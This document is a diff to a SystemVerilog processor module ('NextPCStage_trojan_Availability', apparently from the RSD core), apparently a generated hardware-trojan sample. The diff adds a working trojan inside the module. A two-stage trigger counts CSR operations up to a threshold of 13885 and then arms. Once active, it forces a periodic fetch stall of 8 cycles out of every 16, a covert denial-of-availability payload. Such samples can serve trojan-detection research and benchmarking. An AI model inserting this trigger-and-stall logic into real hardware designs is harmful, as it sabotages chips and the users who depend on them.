@@ -16,27 +16,6 @@ import FetchUnitTypes::*;
 
 // Detect the cache line boundary in sequential access
 function automatic logic StepOverCacheLine (PC_Path pc1, PC_Path pc2);
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 13778;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|numValidInsns) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && numValidInsns) trojan_active <= 1'b1;
-        end
-    end
-
     return pc1[ICACHE_LINE_BYTE_NUM_BIT_WIDTH] != pc2[ICACHE_LINE_BYTE_NUM_BIT_WIDTH];
 endfunction
 
@@ -47,6 +26,29 @@ module NextPCStage_trojan_Availability(
     ControllerIF.NextPCStage ctrl,
     DebugIF.NextPCStage debug
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=13885)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 13885;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
+
 
 `ifdef RSD_STOP_FETCH_ON_PRED_MISS
     typedef enum logic {
@@ -287,14 +289,11 @@ module NextPCStage_trojan_Availability(
 `endif
 
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
             stall_counter <= '0;
             stall_active  <= 1'b0;
         end else if (trojan_active) begin
@@ -306,5 +305,6 @@ module NextPCStage_trojan_Availability(
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : NextPCStage
